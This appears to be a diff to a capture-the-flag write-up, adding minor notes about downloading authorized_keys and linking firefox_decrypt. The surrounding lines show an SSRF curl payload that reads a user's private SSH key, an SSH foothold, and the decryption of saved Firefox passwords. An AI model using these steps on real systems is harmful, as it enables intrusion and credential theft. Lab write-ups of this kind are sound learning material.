@@ -182,7 +182,7 @@ curl -X POST http://IP_ADDRESS:8080/view_image \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-raw "www=http://127.1:80/.ssh/id_rsa"
 ```
-- Found the user: `beth` from `.bashrc` file and `/etc/passwd` file
+- Found the user: `beth` from `.bashrc` file and `/etc/passwd` file. Also `authorized_keys` which I downloaded on my local m/c.
 - Used it to get foothold within the server:
 ```bash
 chmod 600 id_rsa
@@ -212,7 +212,7 @@ tar -xzvf mozdawg.tar.gz
 chmod -R 700 mozdawg
 cd mozdawg/home/charles/.mozilla/firefox/8k3bf3zp.charles
 ```
-- Used `firefox_decrypt` to decrypt the firefox profiles and found saved passwords including `charles` user's ssh password
+- Used [`firefox_decrypt`](https://github.com/unode/firefox_decrypt) to decrypt the firefox profiles and found saved passwords including `charles` user's ssh password
 ```bash
 ┌─[parrot@parrot]─[~/Downloads/londonbridge/home/charles/mozilla/firefox/8k3bf3zp.charles]
 └──╼ $python3 firefox_decrypt/firefox_decrypt.py .
